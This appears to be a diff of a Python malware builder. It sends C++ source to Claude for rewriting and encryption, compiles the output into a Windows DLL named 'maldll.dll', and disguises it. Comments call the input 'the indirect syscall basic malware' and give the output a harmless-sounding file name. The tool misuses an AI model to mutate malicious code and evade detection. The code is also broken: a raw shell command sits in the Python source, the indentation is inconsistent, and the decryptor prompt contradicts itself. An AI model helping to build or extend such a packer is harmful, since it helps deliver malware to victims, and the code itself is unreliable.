@@ -15,12 +15,6 @@ class CPPEncryptedExecutor:
         if api_key:
             self.client = anthropic.Anthropic(api_key=api_key)
     
-    def decrypt_file(self, encrypted_file):
-        """Decrypt file using Claude-generated decryption script."""
-        
-        with open(encrypted_file, 'rb') as f:
-            return f.read()
-    
     def modify_and_encrypt(self, input_cpp, output_encrypted):
         if not self.api_key:
             raise ValueError("API key required for Claude modifications")
@@ -124,7 +118,81 @@ Return ONLY the complete modified C++ code without explanations."""
             f.write(encryptor_code)
         
         print(f"Encryption script saved to '{script_path}'")
+
+        prompt3 = (
+            f"Create a c++ script that performs {new_method} decryption on a file.\n\n"
+            "The script should:\n"
+            "1. Read a file path from command line argument (sys.argv[1])\n"
+            "2. Read the file contents\n"
+            "3. decrypt the contents using the specified decryption method\n"
+            "4. Write the decrypted result to the output file path from sys.argv[2]\n\n"
+            "Use pure Python or standard library only if possible. Include proper error handling.\n"
+            "Return ONLY the Python code without explanations."
+        )
         
+        print("Sending to Claude for decryption script generation...")
+        message3 = self.client.messages.create(
+            model="claude-sonnet-4-5-20250929",
+            max_tokens=8000,
+            messages=[{"role": "user", "content": prompt3}]
+        )
+        decryptor_code = message3.content[0].text
+        decrypt_path = "decryptor.cpp"
+        # Clean markdown fences (looking for Python this time)
+        if "```python" in decryptor_code:
+            decryptor_code = decryptor_code.split("```python", 1)[1].split("```", 1)[0]
+        elif "```py" in decryptor_code:
+            decryptor_code = decryptor_code.split("```py", 1)[1].split("```", 1)[0]
+        elif "```" in decryptor_code:
+            decryptor_code = decryptor_code.split("```", 1)[1].split("```", 1)[0]
+        
+        decryptor_code = decryptor_code.strip()
+        
+        # Save encryption script
+        with open(decrypt_path, 'w', encoding='utf-8') as f:
+            f.write(decryptor_code)
+
+        x86_64-w64-mingw32-g++ -O2 -shared -DMYLIB_BUILD -o mylib.dll mylib.cpp -Wl,--out-implib=libmylib.dll.a -static-libstdc++ -static-libgcc
+        
+
+        
+        output_dll = "maldll.dll"#dll path 
+
+        try:
+        # Compile the  encrypted C++ file into a Windows DLL
+            result = subprocess.run(
+                [
+                "x86_64-w64-mingw32-g++",
+                "-O2",
+                "-shared",
+                "-DMYLIB_BUILD",
+                "-o", output_dll,
+                script_path,
+                "-Wl,--out-implib=libmylib.dll.a",
+                "-static-libstdc++",
+                "-static-libgcc"
+            ],
+            capture_output=True,
+            text=True,
+            check=True,
+            timeout=60
+    )
+        print("Compilation executed successfully.")
+        if result.stdout:
+            print("Compiler output:", result.stdout)
+        if result.stderr:
+            print("Compiler warnings:", result.stderr)
+    except subprocess.CalledProcessError as e:
+        print(f"Error during compilation: {e}")
+        print(f"Stderr: {e.stderr}")
+        if os.path.exists(output_dll):
+            os.remove(output_dll)
+    except subprocess.TimeoutExpired:
+        print("Compilation timed out.")
+        if os.path.exists(output_dll):
+            os.remove(output_dll)
+
+        output_encrypted = "encrypteddll.enc"
         # Run the encryption script on the modified C++ file
         try:
             result = subprocess.run(
@@ -158,78 +226,14 @@ Return ONLY the complete modified C++ code without explanations."""
         
         print(f"Final encrypted file saved to '{output_encrypted}'")
 
-def compile_and_execute(self, encrypted_file, compiler="g++", compile_flags=None, run_args=None):////////////need to update decryption method so it runs properly
-        if compile_flags is None:////////////////////////////////////////
-            compile_flags = ["-std=c++17"]///////////////////
-        if run_args is None:///////////////////////////////////
-            run_args = []
-        
-        print(f"Reading encrypted file '{encrypted_file}'")
-        
-        # Try to read as text (assuming it's been encrypted by Claude's script)
-        try:
-            with open(encrypted_file, 'r', encoding='utf-8') as f:
-                cpp_code = f.read()
-        except UnicodeDecodeError:
-            print("File appears to be binary encrypted, cannot decode")
-            return None
-        
-        # Create temporary directory for compilation
-        with tempfile.TemporaryDirectory() as tmpdir:
-            # Save code to temporary file
-            temp_cpp = os.path.join(tmpdir, "decrypted_temp.cpp")
-            temp_exe = os.path.join(tmpdir, "program")
-            
-            with open(temp_cpp, 'w', encoding='utf-8') as f:
-                f.write(cpp_code)
-            
-            print(f"Compiling...")
-            # Compile the code
-            compile_cmd = [compiler] + compile_flags + [temp_cpp, "-o", temp_exe]
-            
-            try:
-                result = subprocess.run(compile_cmd, 
-                                      capture_output=True, 
-                                      text=True, 
-                                      check=True)
-                print("Compilation successful")
-            except subprocess.CalledProcessError as e:
-                print("Compilation failed:")
-                print(e.stderr)
-                return None
-            
-            # Execute the compiled program
-            print(f"Executing program...")
-            print("-" * 50)
-            try:
-                result = subprocess.run([temp_exe] + run_args,
-                                      capture_output=True,
-                                      text=True,
-                                      timeout=30)
-                print(result.stdout)
-                if result.stderr:
-                    print("STDERR:", result.stderr)
-                print("-" * 50)
-                print(f"Program exited with code {result.returncode}")
-                return result
-            except subprocess.TimeoutExpired:
-                print("Program execution timed out (30s limit)")
-                return None
-    
-# Example usage
+
 if __name__ == "__main__":
-    executor = CPPEncryptedExecutor()
+    executor = CPPEncryptedExecutor()#class
     
     # Example 1: Modify and encrypt with random encryption method
     print("=== MODIFYING AND ENCRYPTING ===")
     executor.modify_and_encrypt(
-        input_cpp="original.cpp",
-        output_encrypted="modified.cpp.enc"
+        input_cpp="malwery.cpp",#the indirect syscall basic malware
+        output_encrypted="normal_app_that_i_like.cpp.enc"#final encrypted dll
     )
     
-    # Example 2: Execute encrypted file
-    print("\n=== EXECUTING ENCRYPTED FILE ===")
-    executor.compile_and_execute(
-        encrypted_file="modified.cpp.enc",
-        compile_flags=["-std=c++17", "-O2"]
-    )
